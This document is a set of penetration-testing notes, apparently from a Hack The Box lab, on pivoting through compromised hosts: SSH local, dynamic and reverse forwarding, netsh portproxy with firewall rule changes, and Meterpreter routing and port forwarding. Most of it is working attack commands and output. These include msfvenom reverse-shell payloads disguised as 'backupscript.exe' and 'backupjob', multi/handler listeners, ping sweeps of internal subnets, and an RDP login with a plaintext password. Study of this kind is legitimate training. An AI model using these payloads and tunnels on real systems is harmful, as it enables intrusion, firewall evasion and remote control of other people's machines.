# SSH Local Port Forwarding

| Pivoting Technique     | Command |
| ---------------------- | ------- |
| Local Port Forwarding  | `ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]` |
| Remote Port Forwarding | `ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]` |
| Socks Proxy            | `ssh -N -f -D listenport [user]@[host]` |


```bash
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```

The `-L` command tells the SSH client to request the SSH server to forward all the data we send via the port `1234` to `localhost:3306` on the Ubuntu server.

Similarly, if we want to forward multiple ports from the Ubuntu server to your localhost, you can do so by including the `local port:server:port` argument to your ssh command. For example, the below command forwards the apache web server's port 80 to your attack host's local port on `8080`.

```bash
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

# **SSH Dynamic Port Forwarding and PIVOT**

```bash
ssh -D 9050 ubuntu@10.129.202.64
```

- We don't know which services lie on the other side of the network. So, we can scan smaller ranges of IPs on the network (`172.16.5.1-200`) or the entire subnet (`172.16.5.0/23`). We cannot perform this scan directly from our attack host because it does not have routes to the `172.16.5.0/23` network.
    
- To do this, we will have to perform `dynamic port forwarding` and `pivot` our network packets via the Ubuntu server. We can do this by starting a `SOCKS listener` on our `local host` (personal attack host or Pwnbox) and then configure SSH to forward that traffic via SSH to the network (172.16.5.0/23) after connecting to the target host.
    
- This is called `SSH tunneling` over `SOCKS proxy`. SOCKS stands for `Socket Secure`, a protocol that helps communicate with servers where you have firewall restrictions in place.
    
- Once the connection is established, network traffic can be routed through the SOCKS server on behalf of the connected client.
    
- This technique is often used to circumvent the restrictions put in place by firewalls, and allow an external entity to bypass the firewall and access a service within the firewalled environment.
    
- One more benefit of using SOCKS proxy for pivoting and forwarding data is that SOCKS proxies can pivot via creating a route to an external server from `NAT networks`.
    
- SOCKS proxies are currently of two types: `SOCKS4` and `SOCKS5`. SOCKS4 doesn't provide any authentication and UDP support, whereas SOCKS5 does provide that.
    
- The `-D` argument requests the SSH server to enable dynamic port forwarding.
    
- To inform proxychains that we must use port 9050, we must modify the proxychains configuration file located at `/etc/proxychains.conf`. We can add `socks4 127.0.0.1 9050` to the last line if it is not already there.
    
    ```bash
    proxychains nmap -v -sn 172.16.5.1-200
    ```
    

# **Remote/Reverse Port Forwarding with SSH**

- Forwards a remote port to a local service.
- Sets up a **reverse SSH tunnel** that allows the target machine to access a service running on your local machine.

```bash
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

- **`R`**: Reverse tunnel (forward from remote to local).
- **`<InternalIPofPivotHost>:8080`**: The target machine (where the SSH connection is established) will listen on this IP and port.
- **`0.0.0.0:8000`**: The local service (on your machine) that will be exposed. `0.0.0.0` means it's accessible from any interface.
- **`ubuntu@<ipAddressofTarget>`**: Connects as user `ubuntu` to the target machine.
- **`vN`**:
    - `v`: Verbose mode (shows detailed connection info).
    - `N`: Do not execute a remote command (just set up the tunnel).

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

```bash
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on <https://0.0.0.0:8000>
```

Any traffic sent to the target machine on port 8080 is forwarded to your local machine's port 8000.

This allows the target machine to access your local service (e.g., a rev shell on port 8000) via `<InternalIPofPivotHost>:8080`.

# Netsh (native)

```powershell
netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport
netsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110
```

```powershell
# Forward the port 4545 for the reverse shell, and the 80 for the http server for example
netsh interface portproxy add v4tov4 listenport=4545 connectaddress=192.168.50.44 connectport=4545
netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.50.44 connectport=80
```

```powershell
# Correctly open the port on the machine
netsh advfirewall firewall add rule name="PortForwarding 80" dir=in action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="PortForwarding 80" dir=out action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="PortForwarding 4545" dir=in action=allow protocol=TCP localport=4545
netsh advfirewall firewall add rule name="PortForwarding 4545" dir=out action=allow protocol=TCP localport=4545
```

1. listenaddress – is a local IP address waiting for a connection.
2. listenport – local listening TCP port (the connection is waited on it).
3. connectaddress – is a local or remote IP address (or DNS name) to which the incoming connection will be redirected.
4. connectport – is a TCP port to which the connection from listenport is forwarded to.


# Meterpreter Tunneling
## 1. ICMP allowed

```shell-session
genzpentester@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8080 
```

We can copy the `backupjob` binary file to the Ubuntu pivot host `over SSH` and execute it to gain a Meterpreter session.

```shell-session
ubuntu@WebServer:~$ ls

backupjob
ubuntu@WebServer:~$ chmod +x backupjob 
ubuntu@WebServer:~$ ./backupjob
```

```shell-session
[*] Sending stage (3020772 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500
meterpreter > pwd

/home/ubuntu
```

We can do ping sweep using Meterpreter with the `ping_sweep` module, which will generate the ICMP traffic from the Ubuntu host to the network `172.16.5.0/23`.

```shell-session
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Performing ping sweep for IP range 172.16.5.0/23
```

We could also perform a ping sweep using a `for loop` directly on a target pivot host that will ping any device in the network range we specify:

#### Ping Sweep For Loop on Linux Pivot Hosts
```shell-session
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

#### Ping Sweep For Loop Using CMD
```cmd-session
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

#### Ping Sweep Using PowerShell
```powershell-session
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

#### Ping Sweep Using PowerShell
```powershell-session
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build its arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built.

## 2. ICMP not allowed

There could be scenarios when a host's firewall blocks ping (ICMP), and the ping won't get us successful replies. In these cases, we can perform a TCP scan on the 172.16.5.0/23 network with Nmap. Instead of using SSH for port forwarding, we can also use **Metasploit's post-exploitation routing** module `socks_proxy` to configure a local proxy on our attack host. We will configure the SOCKS proxy for `SOCKS version 4a`. This SOCKS configuration will start a listener on port `9050` and route all the traffic received via our Meterpreter session.
#### Configuring MSF's SOCKS Proxy
```shell-session
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
```


#### Confirming Proxy Server is Running
```shell-session
msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
```

After initiating the SOCKS server, we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host. We can add the below line at the end of our `proxychains.conf` file located at `/etc/proxychains.conf` if it isn't already there.

```shell-session
socks4 	127.0.0.1 9050
```

Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the `post/multi/manage/autoroute` module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.

```shell-session
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```

It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.

```shell-session
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes
```

After adding the necessary route(s) we can use the `-p` option to list the active routes to make sure our configuration is applied as expected.

```shell-session
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.4.0         255.255.254.0      Session 1
   172.16.5.0         255.255.254.0      Session 1
```

As you can see from the output above, the route has been added to the 172.16.5.0/23 network. We will now be able to use proxychains to route our Nmap traffic via our Meterpreter session.

```shell-session
genzpentester@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

```

## 3. Port Forwarding

Port forwarding can also be accomplished using Meterpreter's `portfwd` module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.

```shell-session
meterpreter > help portfwd

Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

   -h        Help banner.
   -i <opt>  Index of the port forward entry to interact with (see the "list" command).
   -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
   -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
   -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
   -r <opt>  Forward: remote host to connect to.
   -R        Indicates a reverse port forward.
```

#### Creating Local TCP Relay

```shell-session
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```

The above command requests the Meterpreter session to start a listener on our attack host's local port (`-l`) `3300` and forward all the packets to the remote (`-r`) Windows server `172.16.5.19` on `3389` port (`-p`) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.

#### Connecting to Windows Target through localhost

```shell-session
genzpentester@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

## 4. Meterpreter Reverse Port Forwarding

You might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host.
We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port `1234` to our listener on port `8081`.

We can create a reverse port forward on our existing shell from the previous scenario using the below command. This command forwards all connections on port `1234` running on the Ubuntu server to our attack host on local port (`-l`) `8081`. We will also configure our listener to listen on port 8081 for a Windows shell.

```shell-session
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```

#### Configuring & Starting multi/handler

```shell-session
meterpreter > bg

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081

msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081 
```

We can now create a reverse shell payload that will send a connection back to our Ubuntu server on `172.16.5.129`:`1234` when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to `attack host's ip`:`8081` that we configured.

#### Generating the Windows Payload

```shell-session
genzpentester@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

Finally, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.
#### Establishing the Meterpreter session

```shell-session
[*] Started reverse TCP handler on 0.0.0.0:8081 
[*] Sending stage (200262 bytes) to 10.10.14.18
[*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500
